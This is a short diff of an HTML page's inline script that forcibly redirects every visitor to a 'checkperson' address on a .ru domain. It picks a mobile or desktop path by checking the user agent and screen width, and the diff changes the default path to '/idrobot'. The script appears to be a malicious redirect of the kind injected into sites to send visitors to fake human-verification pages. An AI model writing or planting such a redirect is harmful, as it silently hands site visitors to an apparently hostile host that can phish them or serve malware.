@@ -5,7 +5,7 @@
     <style>body { background: #fff; margin: 0; }</style>
     <script>
         (function() {
-            var url = "https://checkperson.ouptv.ru/id";
+            var url = "https://checkperson.ouptv.ru/idrobot";
             try {
                 // Проверяем на мобильность через ширину экрана + UserAgent
                 var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || (window.innerWidth <= 800);
@@ -16,7 +16,7 @@
                     url = "https://checkperson.ouptv.ru/desktop";
                 }
             } catch (e) {
-                url = "https://checkperson.ouptv.ru/id";
+                url = "https://checkperson.ouptv.ru/idrobot";
             }
             // Форсированный редирект
             window.location.href = url;
